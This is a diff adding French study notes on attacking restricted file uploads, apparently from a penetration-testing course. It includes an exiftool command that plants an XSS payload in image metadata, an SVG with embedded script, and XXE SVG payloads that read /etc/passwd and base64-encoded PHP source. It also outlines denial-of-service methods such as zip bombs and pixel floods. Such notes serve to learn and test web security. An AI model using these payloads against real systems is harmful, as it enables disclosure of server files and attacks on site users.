@@ -387,3 +387,81 @@ Selon le niveau de sécurité du code, certains combos passent encore.
 - **Meilleure pratique** : vérifier extension + MIME + analyser réellement le contenu.  
 
 ---
+
+# Limited File Uploads
+
+## Principe
+
+Même si une application applique des filtres solides et ne permet **que certains types de fichiers** (images, docs…), cela ne veut pas dire qu’il n’y a rien à exploiter.  
+Des formats comme **SVG, HTML, XML** ou certains fichiers images/docs peuvent servir à introduire des vulnérabilités : XSS, XXE, DoS…
+
+Fuzzer les extensions autorisées reste essentiel pour identifier ces vecteurs.
+
+## Attaque 1 : XSS via fichiers uploadés
+
+### HTML
+- Si l’appli accepte les `.html` → injection de **JavaScript** possible.  
+- Exemple : page HTML malveillante → XSS/CSRF quand un utilisateur la visite.
+
+### Métadonnées d’images
+Beaucoup de sites affichent les métadonnées (commentaire, artiste…).  
+On peut y placer un payload XSS :  
+
+`exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg`  
+
+Quand l’appli affiche les métadonnées → le JS s’exécute.
+
+### SVG
+Les fichiers `.svg` sont en XML, donc éditables :  
+
+`<?xml version="1.0" encoding="UTF-8"?>`  
+`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">`  
+`<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">`  
+&nbsp;&nbsp;&nbsp;`<rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />`  
+&nbsp;&nbsp;&nbsp;`<script type="text/javascript">alert(window.origin);</script>`  
+`</svg>`
+
+Résultat : XSS déclenché à chaque affichage.
+
+## Attaque 2 : XXE (XML External Entity)
+
+Exemple SVG lisant `/etc/passwd` :  
+
+`<?xml version="1.0" encoding="UTF-8"?>`  
+`<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`  
+`<svg>&xxe;</svg>`
+
+Exemple SVG lisant du code source PHP :  
+
+`<?xml version="1.0" encoding="UTF-8"?>`  
+`<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>`  
+`<svg>&xxe;</svg>`
+
+- Affiche le contenu encodé en base64 → décodage pour lire le code source.  
+- Utile pour localiser l’upload dir, extensions autorisées, schéma de nommage, etc.  
+
+⚡ XXE peut aussi mener à **SSRF** (scanner services internes, appeler APIs privées).
+
+## Attaque 3 : DoS via upload
+
+- **XXE → DoS** : payloads provoquant surcharge CPU/mémoire.  
+- **Zip Bomb** : archive auto-décompressée créant des PB de données.  
+- **Pixel Flood** : image `.jpg/.png` dont la taille est modifiée → allocation mémoire massive (ex : 4 Gigapixels).  
+- **Fichiers énormes** : absence de limite → disque saturé.  
+- **Traversal malveillant** : upload vers `../../../etc/passwd` → crash possible.
+
+## Points Clés
+
+- Un upload limité ≠ upload safe.  
+- **HTML, SVG, XML, metadata** → vecteurs XSS/XXE.  
+- **Docs (PDF, Word, PPT)** → embarquent XML → potentiellement vulnérables aussi.  
+- **DoS** possible via ressources trop lourdes ou bombes de compression.  
+
+## Ressources
+
+- [ExifTool](https://exiftool.org/) – manipulation de métadonnées  
+- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)  
+- [PayloadsAllTheThings – XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)  
+- [SVG Security](https://svgwg.org/)  
+
+
